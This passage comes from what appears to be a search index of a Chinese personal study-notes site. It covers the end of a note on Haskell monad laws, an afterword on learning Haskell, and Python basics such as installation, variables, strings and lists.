-> join ( fmap g ( f x ))) $ m = join . fmap ( \\ x -> f x >>= g ) $ m = join ( fmap ( \\ x -> f x >>= g ) m ) = m >>= ( \\ x -> f x >>= g ) \u6709\u5173 do \u8bed\u53e5\u548c >=> \u7684\u516c\u7406\u8868\u8ff0\u5728\u4e0a\u6587\u4e2d\u5df2\u7ecf\u8bf4\u8fc7","title":"\u5355\u5b50\u516c\u7406"},{"location":"cs/pl/haskell/#_30","text":"\u5543\u4e86\u5c06\u8fd1\u4e00\u4e2a\u6708\uff0c\u7b97\u662f\u628a Haskell \u7684\u4e3b\u8981\u5185\u5bb9\u90fd\u5543\u5b8c\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u524d\u671f\u770b Learn You a Haskell \uff0c\u540e\u671f\u770b Typeclassopedia \uff0c\u90fd\u662f pdcxs \u63a8\u8350\u7ed9\u7684\u6559\u7a0b\u3002\u4f46\u662f\u4e00\u5806\u89c6\u9891\u4e00\u4e2a\u90fd\u6ca1\u6709\u8010\u5fc3\u770b\u8fdb\u53bbqwq \u540e\u9762\u7684\u90e8\u5206\u7684\u7406\u89e3\u611f\u89c9\u4e5f\u6ca1\u5230\u4f4d\uff0cCategory\u3001Arrow \u7b49\u8fd9\u4e9b\u7c7b\u578b\u7c7b\u4e5f\u5c31\u662f\u5927\u81f4\u5730\u770b\u4e86\u4e00\u773c\uff0c\u751a\u81f3\u6709\u4ec0\u4e48\u7528\u90fd\u4e0d\u592a\u6e05\u695a_(:\u0437\u300d\u2220)_ \u611f\u89c9 Haskell \u8fd9\u95e8\u8bed\u8a00\u786e\u5b9e\u5f88\u795e\u5947\uff0c\u5f88\u591a\u8bed\u6cd5\u90fd\u5f88\u6709\u610f\u601d\uff0c\u800c\u4e14\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u8d34\u8fd1\u6570\u5b66\u3001\u8d34\u8fd1\u6570\u5b66\u6982\u5ff5\u3002\u5b66\u7684\u65f6\u5019\u4e5f\u662f\u8d8a\u5b66\u5751\u8d8a\u591a\uff0c\u5148\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u5f15\u7533\u5230\u4e86 lambda \u6f14\u7b97\uff0c\u7136\u540e\u662f\u51fd\u5b50\u7b49\u4e00\u7cfb\u5217\u6982\u5ff5\u5f15\u7533\u5230\u4e86\u8303\u7574\u8bba\uff0c\u76ee\u524d\u8303\u7574\u8bba\u7b80\u5355\u5730\u770b\u4e86\u4e00\u90e8\u5206\uff0clambda \u6f14\u7b97\u4e5f\u6ca1\u6df1\u5165\u7814\u7a76\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u8bf4\u4e86\uff08\u5495\u5495\u5495\uff09 \u73b0\u5728\u611f\u89c9\u6211\u5b66\u5230\u7684 Haskell \u7b80\u76f4\u662f\u76ae\u6bdb\uff0c\u8fd8\u6709\u4e00\u5806\u6e90\u7801\u91cc\u7684\u4e1c\u897f\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e#\uff0c~\uff09\uff0c\u4e5f\u8fd8\u6709\u4e00\u5806\u7c7b\u578b\u7c7b\u548c\u7528\u6cd5\u6ca1\u6709\u5b66\u5230\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e Monad Transformer\u3001Writer\u3001Reader\u3001State\u3001Comonad\u3001MonadFix\u3001Lens\u3001Parsec\u3001\u2026\u2026\uff09 md\uff0c\u8fd9\u4e48\u4e00\u770b\u5dee\u7684\u8fd8\u771f\u591a \uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u6162\u6162\u5b66\u4e86\uff0c\u8fd9\u4e2a\u5047\u671f\u8fd8\u6709\u597d\u591a\u5176\u5b83\u4e8b\u8981\u5e72\u5462\uff0cHaskell \u8fd9\u8fb9\u5148\u6478\u4e86_(:\u0437\u300d\u2220)_","title":"\u540e\u8bb0"},{"location":"cs/pl/haskell/#reference","text":"Learn You a Haskell Writing foldl using foldr - StackOverflow Haskell\uff1a\u7528foldr\u5b9a\u4e49foldl Typeclassopedia - Haskell wiki Hoogle Functors, Applicatives, And Monads In Pictures Haskell\u5b66\u4e60 - functor Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff088\uff09Monoid - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0816\uff09Alternative - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0840\uff09Arrow\uff081\uff09 - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0847\uff09Arrow\uff082\uff09 - zwvista Haskell/Category theory - wikibooks Category theory - wikipedia \u8303\u7574\u8bba - \u7ef4\u57fa\u767e\u79d1 Monad (category theory) - wikipedia Functor - wikipedia \"The End?\"","title":"Reference"},{"location":"cs/pl/python/","text":"Python \u00b6 Abstract \u6211\u5728 2018 \u5e74\u63a5\u89e6\u7684\u7b2c\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e5f\u662f\u6700\u5e38\u7528\u3001\u6700\u719f\u7ec3\u7684\u4e00\u95e8\u4e86 \u8fd9\u91cc\u4e1c\u897f\u8fd8\u4e0d\u5168\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5145\u5427 (:\u0437\u300d\u2220) Table of Contents \u00b6 Python \u8bed\u6cd5\u57fa\u7840 NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93\uff08 TODO \uff09 PIL \u56fe\u50cf\u5904\u7406\u5e93\uff08 TODO \uff09 MatPlotLib \u4f5c\u56fe\u5e93\uff08 \u751a\u81f3\u6587\u4ef6\u5939\u90fd\u6ca1\u5efa \uff09","title":"Python"},{"location":"cs/pl/python/#python","text":"Abstract \u6211\u5728 2018 \u5e74\u63a5\u89e6\u7684\u7b2c\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e5f\u662f\u6700\u5e38\u7528\u3001\u6700\u719f\u7ec3\u7684\u4e00\u95e8\u4e86 \u8fd9\u91cc\u4e1c\u897f\u8fd8\u4e0d\u5168\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5145\u5427 (:\u0437\u300d\u2220)","title":"Python"},{"location":"cs/pl/python/#table-of-contents","text":"Python \u8bed\u6cd5\u57fa\u7840 NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93\uff08 TODO \uff09 PIL \u56fe\u50cf\u5904\u7406\u5e93\uff08 TODO \uff09 MatPlotLib \u4f5c\u56fe\u5e93\uff08 \u751a\u81f3\u6587\u4ef6\u5939\u90fd\u6ca1\u5efa \uff09","title":"Table of Contents"},{"location":"cs/pl/python/basic/","text":"Python \u8bed\u6cd5\u57fa\u7840 \u00b6 Abstract \u61d2\u5f97\u518d\u6574\u7406\u4e86\uff0c\u57fa\u672c\u4e0a\u662f\u4e4b\u524d\u4e00\u6b21 Python \u57fa\u7840\u6559\u5b66\u76f4\u64ad\u7684 slides \u6587\u5b57\u5185\u5bb9\uff0c\u5173\u4e8e\u57fa\u7840\u6559\u5b66\uff1a GitHub \u4ed3\u5e93\uff1a TonyCrane/PythonLecture slides\uff1a https://slides.tonycrane.cc/PythonLecture/ \u90e8\u5206\u76f4\u64ad\u56de\u653e\uff1a https://www.bilibili.com/video/BV13Z4y1h7x5/?vd_source=c0de364997e494206a0fb88c9ee8bfb1 \u8fd9\u91cc\u662f\u7eaf\u7684 slides \u6539\u5199\uff0c\u6548\u679c\u6ca1\u6709\u76f4\u63a5\u770b slides \u597d\uff0c\u800c\u4e14\u53ef\u80fd\u6709\u9519\u8bef\uff0c\u53d1\u73b0\u8bf7\u53ca\u65f6\u8bc4\u8bba\u544a\u8bc9\u6211 \u4ec0\u4e48\u662f python \u00b6 \u89e3\u91ca\u6027\u7684\u811a\u672c\u8bed\u8a00\uff1a\u901a\u8fc7\u89e3\u91ca\u5668\u6765\u76f4\u63a5\u8fd0\u884c\uff0c\u4e0d\u9700\u8981\u7f16\u8bd1\u94fe\u63a5\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6 \u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff1a\u7c7b\u578b\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\uff0c\u4e0d\u9700\u8981\u901a\u8fc7\u4ee3\u7801\u660e\u6587\u89c4\u5b9a \u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff1apython \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61 ... \u600e\u4e48\u88c5 python \u00b6 \u88c5\u7684\u662f\u4ec0\u4e48\uff1f \u662f\u4e00\u4e2a python \u89e3\u91ca\u5668 \uff0c\u4ee5\u53ca\u8fd0\u884c\u9700\u8981\u7684 \u73af\u5883 \u600e\u4e48\u88c5\uff1f \u5b98\u65b9\u7f51\u7ad9 https://www.python.org/downloads/ conda\uff08\u4e00\u4e2a\u597d\u7528\u7684 python \u73af\u5883\u7ba1\u7406\u5de5\u5177\uff09 anaconda \uff08\u5927\u3001\u6709\u9884\u88c5\u73af\u5883\uff09 https://www.anaconda.com/ miniconda \uff08\u5c0f\uff09 https://docs.conda.io/en/latest/miniconda \u6781\u4e0d\u5efa\u8bae\u901a\u8fc7\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\u5b89\u88c5 python \u88c5\u4ec0\u4e48\u7248\u672c\uff1f \u4e24\u4e2a\u5927\u7248\u672c\uff0c2.* \u548c 3.*\uff0c\u5dee\u522b\u8f83\u5927\uff0c\u5efa\u8bae 3.* \u4e00\u4e9b\u5c0f\u7248\u672c\uff0c3.6 \u53ca\u4e4b\u524d\u4e0d\u63a8\u8350\uff0c3.7 3.8 \u7a33\u5b9a\uff0c3.9 3.10 \u5b8c\u5584\u4e2d\uff0c3.11 \u9884\u89c8\u4e2d \u7ec6\u5206\u7248\u672c\uff0c\u9009\u62e9\u6700\u65b0\uff0c3.7.13\u30013.8.13\u30013.9.12\u30013.10.4 conda \u4e0d\u5fc5\u62c5\u5fc3\u7248\u672c\uff0c\u9ed8\u8ba4 3.9\uff0c\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u865a\u62df\u73af\u5883\u6765\u4f7f\u7528\u4e0d\u540c\u7248\u672c \u600e\u4e48\u7f16\u5199\u3001\u8fd0\u884c python \u00b6 \u600e\u4e48\u7528 python\uff1f \u8bb0\u4f4f\u4f60\u4e0b\u8f7d\u7684\u662f\u4e00\u4e2a\u89e3\u91ca\u5668\uff0c\u5efa\u8bae\u901a\u8fc7\u547d\u4ee4\u884c\u8fd0\u884c python code.py \u4ec0\u4e48\u662f\u547d\u4ee4\u884c\uff1f \u901a\u8fc7\u8f93\u5165\u547d\u4ee4\u6765\u901a\u77e5\u7535\u8111\u6267\u884c\u67d0\u6307\u4ee4\u3001\u6216\u8005\u8fd0\u884c\u67d0\u7a0b\u5e8f Windows\uff1acmd\u3001Powershell -> \u5355\u72ec\u8fd0\u884c / Windows Terminal /... macOS\uff1azsh\u3001... -> \u7ec8\u7aef / iTerm /... Linux\uff1abash\u3001zsh\u3001... -> \u7ec8\u7aef / ... \u7528\u4ec0\u4e48\u5199\u4ee3\u7801\uff1f \u8bb0\u4f4f\u4f60\u7f16\u5199\u7684\u53ea\u662f\u4e00\u4e2a .py \u4f5c\u4e3a\u6269\u5c55\u540d\u7684\u6587\u672c\u6587\u4ef6 \u53ea\u8981\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u5199 \u8bb0\u4e8b\u672c\u3001\u81ea\u5e26 IDLE\u3001word Notepad++\u3001Sublime Text VSCode\uff08Visual Studio Code\uff0c\u4e0d\u662f VS\uff09 code.visualstudio.com Pycharm\uff08Community Edition \u5c31\u591f\u7528\uff09 jetbrains.com/pycharm \u53d8\u91cf \u00b6 \u7ed9\u4e00\u4e2a\u5185\u5bb9\u7ed1\u5b9a\u4e00\u4e2a\u6807\u7b7e\u5373\u53d8\u91cf\u540d\uff08\u6ce8\u610f\u8bf7\u4e0d\u8981\u8ba4\u4e3a\u53d8\u91cf\u7c7b\u4f3c\u4e00\u4e2a\u201c\u76d2\u5b50\u201d\uff09 \u901a\u8fc7 = \u6765\u5b9a\u4e49\u53d8\u91cf\uff0c\u53d8\u91cf\u540d = \u5185\u5bb9 \u52a8\u6001\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u89c4\u5b9a\u7c7b\u578b\uff08\u53ef\u4ee5\u901a\u8fc7 \u53d8\u91cf\u540d: \u7c7b\u578b = \u5185\u5bb9 \u6765\u8fdb\u884c\u7c7b\u578b\u6807\u6ce8\uff09 \u53d8\u91cf\u540d \u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001 \u4e2d\u6587 \uff0c\u4e0d\u80fd\u6709\u7a7a\u683c\u548c\u5176\u5b83\u7b26\u53f7 \u53ea\u80fd\u4ee5\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u800c\u4e14\u5927\u5c0f\u5199\u654f\u611f \u4e0d\u80fd\u7528\u5173\u952e\u5b57\uff08\u4f8b\u5982 if def \u7b49\uff09\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d \u6e05\u6670\u660e\u786e\u3001\u98ce\u683c\u7edf\u4e00 \u5168\u5927\u5199\u4e00\u822c\u8868\u793a\u5e38\u91cf\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u6216\u8005\u5f00\u5934\u7ed3\u5c3e\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528 _ \u4f5c\u4e3a\u53d8\u91cf\u540d \u6570\u636e\u7c7b\u578b \u00b6 \u6570\u5b57\u4e0e\u8fd0\u7b97 \u00b6 1 \u662f\u6574\u6570\uff0c1. \u662f\u6d6e\u70b9\u6570 \u6574\u6570\u4e0e\u6d6e\u70b9\u6570\u8f6c\u6362 int(...)\uff1a\u5411 0 \u820d\u5165 round(...)\uff1a\u5411\u5076\u820d\u5165\uff08\u56db\u820d\u516d\u5165\u4e94\u51d1\u5076\uff0c\u53ef\u4ee5\u5f53\u6210\u56db\u820d\u4e94\u5165\uff09 math.floor(...)\u3001math.ceil(...)\uff1a\u4e0b\u53d6\u6574\u3001\u4e0a\u53d6\u6574\uff08\u9700\u8981 import math\uff09 \u8fd0\u7b97 + - * \u52a0\u51cf\u4e58\uff0c\u5de6\u53f3\u90fd\u662f\u6574\u6570\u7ed3\u679c\u4e5f\u662f\u6574\u6570\uff0c\u6709\u6d6e\u70b9\u6570\u7ed3\u679c\u5c31\u662f\u6d6e\u70b9\u6570 / \u9664\u6cd5\uff0c\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff08\u5373\u4f7f\u53ef\u4ee5\u6574\u9664\uff09 // \u6574\u9664\uff0c\u7ed3\u679c\u662f\u6574\u6570\uff0c\u5411\u4e0b\u53d6\u6574 % \u53d6\u6a21\uff0ca % b == a - (a//b)*b\uff08\u548c c \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\uff09 ** \u4e58\u65b9\uff0c\u53ef\u4ee5\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u5982 a ** 0.5 \u8868\u793a\u5f00\u6839\u53f7 pow(a, b, mod)\uff1a\u4e5f\u662f\u4e58\u65b9\uff0cmod \u53ef\u4ee5\u7701\u7565\uff0c\u5982\u679c\u6709 mod \u5219\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u5982\u679c mod \u4e3a -1 \u5219\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143 \u66f4\u591a\u8fd0\u7b97\u901a\u8fc7 math\u3001numpy\u3001scipy \u7b49\u5305\u6765\u8fdb\u884c \u590d\u6570\u7c7b\u578b \u00b6 python \u4e2d\u5185\u7f6e\u4e86\u590d\u6570\u7c7b\u578b\uff0c1+2j \u5f62\u5f0f\u5c31\u8868\u793a\u4e00\u4e2a\u590d\u6570\uff0c\u5176\u4e2d j \u5373\u865a\u6570\u5355\u4f4d i \u6216\u8005\u4f7f\u7528 complex(\u5b9e\u90e8, \u865a\u90e8) \u5f62\u5f0f\u5b9a\u4e49\u590d\u6570 \u53ef\u4ee5\u8fdb\u884c\u590d\u6570\u7684\u52a0\u51cf\u4e58\u9664\u8fd0\u7b97 \u5c5e\u6027\u4e0e\u65b9\u6cd5 c.real\uff1a\u5b9e\u90e8 c.imag\uff1a\u865a\u90e8 c.conjugate()\uff1a\u8fd4\u56de\u5171\u8f6d\u590d\u6570 \u5b57\u7b26\u4e32 \u00b6 \u5355\u5f15\u53f7 '...'\uff0c\u53cc\u5f15\u53f7 \"...\"\uff0c\u4e09\u5f15\u53f7 '''...''' \"\"\"...\"\"\"\uff08\u53ef\u4ee5\u5185\u90e8\u6362\u884c\uff09 \\n \u6362\u884c\uff0c\\t \u5236\u8868\u7b26\uff0c\\r \u56de\u8f66\uff0c\\' \u5355\u5f15\u53f7\uff0c\\\" \u53cc\u5f15\u53f7\uff0c\\\\ \u659c\u6760\uff08\u53ea\u6253\u4e00\u4e2a \u4f1a\u51fa\u95ee\u9898\uff09\uff0c\u2026\u2026 \u524d\u7f00 r-string\uff1ar\"...\"\uff0c\u5f15\u53f7\u4e2d\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4e00\u4e2a \u5c31\u4ee3\u8868\u659c\u6760\u5b57\u7b26\u672c\u8eab f-string\uff1af\"...\"\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 b-string\uff1ab\"...\"\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a bytes\uff0c\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26 \u5e38\u7528\u65b9\u6cd5 \u62fc\u63a5\uff1a\u76f4\u63a5\u5c06\u5b57\u7b26\u4e32\u201c\u76f8\u52a0\u201d \"...\".upper()\u3001\"...\".lower()\uff1a\u8f6c\u4e3a\u5168\u5927\u5199\u3001\u5168\u5c0f\u5199 \"...\".title()\uff1a\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199 \"...\".strip()\uff1a\u5220\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u7a7a\u767d\uff08\u5305\u542b\u7a7a\u683c\u548c\u5236\u8868\u7b26\uff09 \"...\".lstrip()\u3001\"...\".rstrip()\uff1a\u5220\u9664\u5de6\u3001\u53f3\u7aef\u7a7a\u767d \"...\".split(c)\uff1a\u6839\u636e\u5b57\u7b26 c \u6765\u62c6\u5206\u5b57\u7b26\u4e32\u5f97\u5230\u5217\u8868\uff0c\u9ed8\u8ba4\u62c6\u5206\u7a7a\u767d f-string \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65b9\u5f0f\uff1a\"...\" % ...\uff0c\"...\".format(...)\uff0cf\"...\" \u5b57\u7b26\u4e32\u5185\u5927\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u8ba1\u7b97\u540e\u8f6c\u4e3a\u5b57\u7b26\u4e32\u586b\u5165 f\"...{...}...\" \u5982\u679c\u5b57\u7b26\u4e32\u8981\u7528\u5927\u62ec\u53f7\u539f\u59cb\u5b57\u7b26\u8981\u5199\u4e24\u4e2a f\"...{{...\" \u683c\u5f0f\u5316\uff08\u5728\u586b\u5165\u5185\u5bb9\u540e\u9762\u52a0\u5192\u53f7 f\"...{\u8868\u8fbe\u5f0f:\u683c\u5f0f}...\"\uff09 \u5bbd\u5ea6\u586b\u5145\uff1a:[\u586b\u5145\u5b57\u7b26][\u5bf9\u9f50\u65b9\u5f0f][\u5bbd\u5ea6]\uff0c< \u5de6\u5bf9\u9f50\uff0c> \u53f3\u5bf9\u9f50\uff0c^ \u5c45\u4e2d \u5b57\u7b26\u622a\u65ad\uff1a:[...].n\uff0c\u53ea\u663e\u793a\u5b57\u7b26\u4e32\u7684\u524d n \u4e2a\u5b57\u7b26 \u6570\u503c\u7b26\u53f7\uff1a:+ \u6b63\u6570\u52a0\u6b63\u53f7\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7\uff0c:- \u539f\u6837\uff0c: \uff08\u7a7a\u683c\uff09\u6b63\u6570\u52a0\u7a7a\u683c\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7 \u6570\u503c\u7cbe\u5ea6\uff1a:[\u5bbd\u5ea6][\u5206\u9694\u7b26(,_)].[\u7cbe\u5ea6]f\uff0c\u6ca1\u6709\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6 \u8fdb\u5236\u663e\u793a\uff1ax \u5c0f\u5199\u5341\u516d\u8fdb\u5236\uff0cX \u5927\u5199\u5341\u516d\u8fdb\u5236\uff0co \u516b\u8fdb\u5236\uff0cb \u4e8c\u8fdb\u5236\uff0c\u52a0 # \u663e\u793a\u524d\u7f00 \u5b57\u8282\u7c7b\u578b \u00b6 \u7c7b\u4f3c\u5b57\u7b26\u4e32\uff0c\u4f46\u5b58\u50a8\u7684\u662f\u5b57\u8282\u7684\u503c\uff0c\u66f4\u50cf\u5217\u8868\uff0c\u663e\u793a\u4e3a b\"...\" \u53ea\u662f\u66f4\u52a0\u6613\u8bfb\u800c\u5df2 b\"...\" \u5219\u8868\u793a\u5b57\u8282\u7c7b\u578b\uff0c\u5176\u4e2d\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26\u548c \\x.. \u8868\u793a\u7684\u5341\u516d\u8fdb\u5236\u6570 \u4e0e\u5b57\u7b26\u4e32\u8f6c\u6362 \"...\".encode(encoding) \u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4 UTF-8 bytes_obj.decode(encoding) \u6839\u636e encoding \u89e3\u7801\u5b57\u8282\u5e8f\u5217\uff0c\u89e3\u7801\u5931\u8d25\u4f1a\u62a5\u9519 bytes(\"...\", encoding) \u4e5f\u662f\u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32 \u4e0d\u8981\u4f7f\u7528 str(b\"...\") \u6765\u5c06\u5b57\u8282\u5e8f\u5217\u8f6c\u4e3a\u5b57\u7b26\u4e32 \u5e03\u5c14\u7c7b\u578b \u00b6 True \u548c False\uff0c\u8bb0\u4f4f\u9996\u5b57\u6bcd\u5927\u5199 \u7528 bool(...) \u6765\u8f6c\u6362\uff0c\u5982\u679c\u662f\u6570\u5b57\u5219\u975e\u96f6\u90fd\u662f True\uff0c\u5982\u679c\u662f\u5b57\u7b26\u4e32\u5219\u975e\u7a7a\u90fd\u662f True \u8fd0\u7b97 \u53ef\u4ee5\u4f7f\u7528 & | \u6765\u8868\u793a\u4e0e\u548c\u6216\uff08\u4f46\u5e76\u4e0d\u4f1a\u77ed\u8def\uff09 \u4e00\u822c\u4f7f\u7528 and or not \u8fdb\u884c\u4e0e/\u6216/\u975e\u8fd0\u7b97\uff08\u4f1a\u77ed\u8def\uff09 \u5217\u8868 \u00b6 \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u529f\u80fd\u66f4\u591a\uff0c\u800c\u4e14\u5185\u90e8\u5143\u7d20\u4e0d\u8981\u6c42\u540c\u4e00\u7c7b\u578b \u65b9\u62ec\u53f7 [] \u8868\u793a\u5217\u8868\uff0c\u5143\u7d20\u7528\u9017\u53f7\u5206\u9694 \u7d22\u5f15\uff08\u5373\u4e0b\u6807\uff09\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0clst[n] \u5373\u8868\u793a\u8bbf\u95ee\u7b2c n+1 \u4e2a\u5143\u7d20 \u7d22\u5f15\u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u8d1f\u6570\u5373\u8868\u793a\u5012\u6570\uff0c\u4f8b lst[-2] \u8868\u793a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5143\u7d20 \u5207\u7247\uff08\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u90e8\u5206\u503c\uff09 lst[a:b]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u7684\u5217\u8868 lst[:b]\uff1a\u4ece\u5f00\u5934\u5230 lst[b-1] \u7684\u5217\u8868 lst[a:]\uff1a\u4ece lst[a] \u5230\u7ed3\u5c3e\u7684\u5217\u8868 lst[:]\uff1a\u8868\u793a\u6574\u4e2a\u5217\u8868\uff08\u62f7\u8d1d\u4e00\u4efd\uff09 lst[a:b:c]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u6bcf c \u4e2a\uff08\u5373\u6b65\u957f\uff09\u53d6\u4e00\u4e2a\u5f62\u6210\u7684\u5217\u8868 c \u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u6b64\u65f6\u9700\u8981 a > b \u624d\u80fd\u83b7\u53d6\u5230\u503c \u6709\u6b65\u957f\u65f6\u82e5\u7701\u7565 a\u3001b \u8bb0\u5f97\u4e0d\u8981\u7701\u7565\u5192\u53f7\uff0c\u4f8b lst[::-1] \u8868\u793a\u5217\u8868\u5012\u5e8f \u5217\u8868\u64cd\u4f5c \u00b6 \u4fee\u6539\u5143\u7d20\uff1a\u76f4\u63a5\u901a\u8fc7\u7d22\u5f15/\u5207\u7247\uff0c\u7136\u540e\u7b49\u53f7\u8d4b\u503c \u6709\u6808\u7684\u529f\u80fd lst.append(...) \u5728\u5217\u8868\u672b\u5c3e\u52a0\u5165\u5143\u7d20 lst.pop() \u5f39\u51fa\u5217\u8868\u672b\u5c3e\u5143\u7d20\u5e76\u8fd4\u56de \u4efb\u610f\u4f4d\u7f6e\u63d2\u5165\u5f39\u51fa lst.insert(i, x) \u5728\u7d22\u5f15 i \u7684\u4f4d\u7f6e\u63d2\u5165 x\uff0c\u540e\u9762\u4f9d\u6b21\u540e\u79fb lst.pop(i) \u5f39\u51fa\u7d22\u5f15 i \u4f4d\u7f6e\u7684\u5143\u7d20\uff0c\u540e\u9762\u4f9d\u6b21\u524d\u79fb \u5217\u8868\u62fc\u63a5 \u76f4\u63a5\u76f8\u52a0\uff0c\u4e0d\u6539\u53d8\u539f\u5217\u8868\uff0c\u5f97\u5230\u65b0\u7684\u5217\u8868 lst.extend([...])\uff0c\u628a\u4e00\u4e2a\u5217\u8868\u63a5\u5230\u5f53\u524d\u5217\u8868\u540e\u9762 \u6839\u636e\u503c\u5220\u9664\u5143\u7d20 lst.remove(value) \u5220\u9664\u7b2c\u4e00\u4e2a\u503c\u4e3a value \u7684\u5143\u7d20 \u6392\u5e8f\u5217\u8868 lst.sort() \u6c38\u4e45\u6392\u5e8f\uff08\u5373\u6392\u5e8f\u540e\u8d4b\u503c\u7ed9\u5f53\u524d\u5217\u8868\uff09 sorted(lst) \u4e34\u65f6\u6392\u5e8f\uff0c\u8fd4\u56de\u6392\u5e8f\u597d\u7684\u65b0\u5217\u8868 \u9ed8\u8ba4\u4ece\u5c0f\u5230\u5927\uff0c\u5982\u679c\u4f20\u5165 reverse=True \u5219\u4ece\u5927\u5230\u5c0f \u53cd\u8f6c\u5217\u8868 lst.reverse() \u6c38\u4e45\u53cd\u8f6c\uff08\u610f\u4e49\u540c\u4e0a\uff09 lst[::-1] \u8fd4\u56de\u53cd\u8f6c\u7684\u5217\u8868\uff08\u5229\u7528\u524d\u9762\u8bf4\u5230\u7684\u5207\u7247\uff09 \u7edf\u8ba1\u64cd\u4f5c len(lst) \u5f97\u5230\u5217\u8868\u7684\u957f\u5ea6 sum(lst) \u5f97\u5230\u5217\u8868\u7684\u5143\u7d20\u548c\uff08\u672c\u8d28\u4e0a\u662f\u5c06 start \u53c2\u6570\u548c\u6bcf\u4e2a\u5143\u7d20\u4f9d\u6b21\u76f8\u52a0\uff09 \u53ef\u4ee5\u4f20\u5165 start \u53c2\u6570\u7528\u6765\u6307\u5b9a\u52a0\u548c\u7684\u8d77\u59cb\u503c max(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c min(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c \u5143\u7ec4 \u00b6 \u53ef\u4ee5\u770b\u6210\u5143\u7d20\u4e0d\u53ef\u53d8\u7684\u5217\u8868\uff0c\u5185\u90e8\u4e5f\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20 \u62ec\u53f7\u8868\u793a\u5143\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u4e00\u6837\u7684\u65b9\u6cd5\u6765\u8bfb\u53d6\u5143\u7d20\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fee\u6539 \u5f53\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u8981\u5199\u6210 (a,) \u800c\u4e0d\u662f (a)\uff08\u540e\u8005\u662f\u5355\u4e2a\u503c\uff09 \u53ef\u4ee5\u4f7f\u7528 tuple(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u5217\u8868\u3001\u5b57\u7b26\u4e32\u7b49\uff09\u8f6c\u4e3a\u5143\u7ec4 \u5143\u7ec4\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5143\u7d20\u5b8c\u5168\u4e0d\u53ef\u53d8 \u907f\u514d\u5728\u5143\u7ec4\u4e2d\u5b58\u653e\u53ef\u53d8\u5143\u7d20 \u96c6\u5408 \u00b6 